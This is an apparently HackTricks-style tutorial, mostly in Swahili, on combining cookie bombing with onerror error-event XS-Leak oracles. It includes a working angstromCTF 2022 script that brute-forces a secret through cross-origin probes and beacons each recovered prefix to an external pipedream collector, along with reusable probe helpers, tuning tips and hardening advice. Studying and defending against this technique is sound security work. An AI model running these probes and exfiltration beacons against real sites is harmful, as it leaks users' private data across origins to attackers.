# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Mbinu hii inachanganya:
- Cookie bombing: kujaza kivinjari cha mwathirika na cookies nyingi/kubwa kwa target origin ili ombi zinazofuata zikutane na vizingiti vya server/ombi (request header size, URL size in redirects, n.k.).
- Error-event oracle: kujaribu cross-origin endpoint na <script> (au subresource nyingine) na kutofautisha hali kwa onload vs onerror.

Wazo kuu
- Tafuta endpoint lengwa ambayo tabia yake inatofautiana kwa hali mbili unazotaka kupima (mf., search “hit” vs “miss”).
- Hakikisha njia ya “hit” itasababisha redirect chain nzito au URL ndefu wakati njia ya “miss” inabaki fupi. Panua request headers kwa kutumia cookies nyingi ili ni njia ya “hit” tu isababisha server kushindwa na HTTP error (mf., 431/414/400). Error inabadilisha onerror event na inakuwa oracle ya XS-Search.

Inafanya kazi lini
- Unaweza kusababisha kivinjari cha mwathirika kutuma cookies kwa target (mf., cookies ni SameSite=None au unaweza kuziweka katika first-party context kupitia popup window.open).
- Kuna kipengele cha app unachoweza kuabusa ili kuweka cookies za hiari (mf., “save preference” endpoints ambazo zinafanya controlled input names/values kuwa Set-Cookie) au kufanya post-auth redirects ambazo zinajumuisha attacker-controlled data ndani ya URL.
- Server inajibu tofauti kwa hali hizo mbili na, kwa headers/URL zilizopanuliwa, hali moja inavuka kikomo na kurudisha response ya error ambayo inachochea onerror.

Kumbuka kuhusu server errors zinazotumika kama oracle
- 431 Request Header Fields Too Large huarudiwa mara nyingi wakati cookies zinapanua request headers; 414 URI Too Long au server-specific 400 inaweza kurudiwa kwa targets za ombi ndefu. Yoyote ya hizi husababisha subresource load kushindikana na kuchoma onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Skripti ifuatayo (kutoka kwenye public writeup) inachafua kipengele kinachomruhusu attacker kuingiza cookies za hiari, kisha inapakia cross-origin search endpoint kama script. Wakati query iko sahihi, server hufanya redirect ambayo, pamoja na cookie bloat, inazidi vizingiti vya server na kurudisha error status, hivyo script.onerror inafanyika; vinginevyo hakuna kinachotendeka.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Why the popup (window.open)?
- Vivinjari vya kisasa vinaanza kuzizuia third‑party cookies. Kufungua top-level window kuelekea target kunafanya cookies kuwa first‑party, hivyo majibu ya Set-Cookie kutoka kwa target yataguma, kuruhusu hatua ya cookie-bomb hata kwa vikwazo vya third‑party cookies.

2024–2025 notes on cookie availability
- Chromium-based browsers bado kwa kawaida hutoa third‑party cookies isipokuwa mtumiaji au tovuti wachague kuacha, lakini Safari na Firefox huzuia most third‑party cookies kwa default. Panga kwa zote: (1) tumia mtiririko wa kuwekea first‑party cookie (window.open + auto-submit kwa cookie-setting endpoint) kisha (2) fanyia probe kwa subresource ambayo inafanikiwa tu wakati cookies hizo zimetumwa. Ikiwa third‑party cookies zimezuiwa, hamisha probe ndani ya muktadha wa same-site (mfano, endesha oracle katika popup kupitia same-site gadget na exfiltrate boolean kwa server yako kwa postMessage au beacon).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Mbadala tag oracle (karatasi ya mtindo)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Ngazi ya juu: de Bruijn–based cookie packing (CTF-proven)
- Wakati app inakuwezesha kudhibiti thamani kubwa za cookie, unaweza kupakia makisia kwa ufanisi kwa kuongeza de Bruijn sequence kwenye kila probe. Hii inafanya overhead kwa kila probe kuwa ndogo huku ikihakikisha heavy branch inabaki nzito zaidi mara kwa mara tu kwa prefix sahihi. Mfano wa generator kwa |Σ| alama za urefu n (inafaa katika cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Wazo kwa vitendo: set multiple cookies whose values are prefix + deBruijn(k,n). Ni tu wakati prefix iliyojaribiwa ni sahihi seva inachukua path nzito (mf., extra redirect inayorefleka cookie ndefu au URL), ambayo, ikichanganywa na cookie bloat, inapita mipaka na kusababisha onerror kubadili tabia. Angalia solver wa umma wa LA CTF 2024 ulio tumia njia hii.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using window.open loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
  - Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
  - SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
  - Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
  - Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
  - X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
  - Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
  - Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
  - Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
